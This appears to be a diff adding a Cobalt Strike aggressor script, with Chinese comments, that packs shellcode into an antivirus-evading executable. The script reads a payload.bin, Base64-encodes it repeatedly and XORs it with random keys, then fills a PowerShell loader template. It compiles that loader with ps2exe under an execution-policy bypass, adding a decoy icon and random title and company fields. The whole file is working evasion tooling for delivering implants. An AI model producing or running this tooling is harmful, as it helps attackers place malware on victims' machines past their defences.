@@ -1,0 +1,94 @@
+menubar("powershell免杀","powershell");
+
+popup powershell {
+	item("&生成exe",{dialog_powershell()});
+}
+
+sub dialog_powershell {
+	$info = dialog("powershell bypass AV",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",ico => "tomcat.ico",key => "66",payload => "payload_cs.ps1",version => "4.0"),&show); 
+	drow_file($info,"bin","Choose: default payload.bin");
+	drow_file($info,"ico","Choose: 添加ico图标");
+	drow_text($info,"key","输入key值");
+	drow_combobox($info, "version", "Version: ", @("powershell 4.0", "powershell 2.0"));
+	dbutton_action($info,"点击生成！"); # dbutton_action将操作按钮添加到dialog，回调函数
+	dialog_show($info); # 显示文本输入框
+}
+
+$path = "C:\\Users\\cseroad\\Desktop\\bypassAV-master";
+# 修改cna地址
+
+global('$new_strs');
+
+sub payload_bin_to_ps1 {
+
+	$key2 = rand(255);
+	$key3 = rand(255);
+	
+	$in = openf($bin_path);
+	$data = readb($in, -1);
+
+	for ($i = 0; $i < 5; $i++){
+		$data = [[java.util.Base64 getEncoder] encodeToString: $data];
+		$data = strrep($data, "/", "-");
+	}
+	$shell_code = split("",$data);
+	$arr = "";
+	for ($i = 0; $i < size($shell_code); $i++){
+		$arr = $arr . "," .asc($shell_code[$i]) ^ $key ^ $key2 ^ $key3;
+	}
+	$arr = right($arr, int(strlen($arr)) - 1);
+	
+	$org_file = $path.'\\powershell_load.ps1';
+	$handle = openf($org_file);
+	while $text (readln($handle)){ 
+		$repl = replace($text, 'var_code =.*', 'var_code ='.$arr);
+		$repl = replace($repl, 'key1', $key);
+		$repl = replace($repl, 'key2', $key2);
+		$repl = replace($repl, 'key3', $key3)."\n";
+		$new_strs = $new_strs.$repl;
+	}
+	
+	
+	$out =  openf(">$payload_file_ps1");
+	writeb($out, $new_strs);
+	closef($out);
+	closef($in);
+	$data = '';
+}
+
+
+sub show {
+	$bin_path = $3["bin"];
+	$key = $3["key"];
+	@array = @("a", "b", "c", "d", "e", "f", "g","h","i");
+	$filename = rand(@array) . rand(@array) . rand(@array);
+	$ico_path = $3["ico"];
+	$payload_file_ps1 = "C:\\windows\\temp\\payload_tmp.ps1";
+	$ps2exe = $path.'\.\\ps2exe.ps1';
+	if (-exists $bin_path && -exists $ico_path) {
+		payload_bin_to_ps1($bin_path,$payload_file_ps1,$key);
+		$version = right($3["version"], 3);
+		$int_version = left($version, 1);
+		prompt_file_save($filename.".exe", {
+			$output_exe = "$1";
+			if ($int_version == "4") {
+				println('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -runtime40 -title '.$filename.' -description '.$filename.'-company '.$filename.' -debug"');
+				$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -runtime40 -title '.$filename.' -description '.$filename.' -company '.$filename.' -debug"');
+		    } else {
+			    $process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -runtime20 -title '.$filename.' -description '.$filename.' -company '.$filename.' -debug | powershell -ExecutionPolicy bypass');
+		    }
+			@data = readAll($process);
+			println(@data);
+			closef($process);
+			if (-exists $output_exe) {
+				# exec('cmd.exe /c del '.$payload_file_ps1);
+				show_message("\n输出exe地址：".$output_exe);
+			} else {
+				show_message('运行异常，请查看script console');
+			}
+		});
+	}else {
+		show_message('请指定bin文件和ico图标');
+	}
+
+}
